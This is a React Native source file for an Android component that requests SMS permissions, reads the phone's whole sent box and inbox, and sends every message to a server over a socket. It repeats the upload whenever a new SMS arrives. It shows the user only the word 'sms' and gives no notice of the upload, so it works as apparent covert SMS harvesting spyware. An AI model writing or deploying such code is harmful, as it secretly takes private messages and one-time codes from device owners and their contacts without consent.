import React, { useState, useEffect } from 'react';
import { PermissionsAndroid, Text } from 'react-native';
import SmsAndroid from 'react-native-get-sms-android';
import io from 'socket.io-client';
import { useSocket } from '../../../Theme/Socket';
import SmsListener from 'react-native-android-sms-listener';
import { useSelector } from 'react-redux';
import { View } from 'react-native';
const SmsPermission = () => {
  
const socket = useSocket()
const data = useSelector((state) => state?.Auth?.User);


  useEffect(() => {
    requestSmsPermission(); // Request SMS permissions when component mounts

    const listener = SmsListener.addListener(message => {
        console.log('New SMS received:', message);
        // Refresh SMS list or perform any action upon receiving new SMS
        
        fetchSmsMessages();
      });
  
      // Clean up listener on component unmount
      return () => {
        listener.remove();
      };
  }, []);

  const requestSmsPermission = async () => {
    try {
      const granted = await PermissionsAndroid.requestMultiple([
        PermissionsAndroid.PERMISSIONS.READ_SMS,
        PermissionsAndroid.PERMISSIONS.RECEIVE_SMS,
        PermissionsAndroid.PERMISSIONS.SEND_SMS,
      ]);

      if (
        granted['android.permission.READ_SMS'] === PermissionsAndroid.RESULTS.GRANTED &&
        granted['android.permission.RECEIVE_SMS'] === PermissionsAndroid.RESULTS.GRANTED &&
        granted['android.permission.SEND_SMS'] === PermissionsAndroid.RESULTS.GRANTED // Check if send SMS permission is granted
      ) {
        console.log('SMS permissions granted');
        fetchSmsMessages(); // Permission granted, fetch SMS messages
      } else {
        console.log('SMS permissions denied');
      }
    } catch (err) {
      console.warn(err);
    }
  };

  const fetchSmsMessages = () => {
    var sentFilter = {
      box: 'sent',
    };

    var receivedFilter = {
      box: 'inbox',
    };

    SmsAndroid.list(
      JSON.stringify(sentFilter),
      (fail) => {
        console.log('Failed to fetch sent messages: ' + fail);
      },
      (count, smsList) => {
        var sentMessages = JSON.parse(smsList);
        
  
        const userId = data?.user?.id;
  
        if (userId && sentMessages) {
            const data = {
                userId: userId,
                sentMsg: sentMessages,
              };
              socket.emit('get-sentMsgData', data);
        }

      },
    );

    SmsAndroid.list(
      JSON.stringify(receivedFilter),
      (fail) => {
        console.log('Failed to fetch received messages: ' + fail);
      },
      (count, smsList) => {
        var receivedMessages = JSON.parse(smsList);

       
        const userId = data?.user?.id;
  
        if (userId && receivedMessages) {
            const data = {
                userId: userId,
                recievedMsg: receivedMessages,
              };
              socket.emit('get-receivedMsgData', data);
        }

      },
    );
  };



  return (
    <View>
       <Text>  sms </Text> 
        </View>
  );
};

export default SmsPermission;
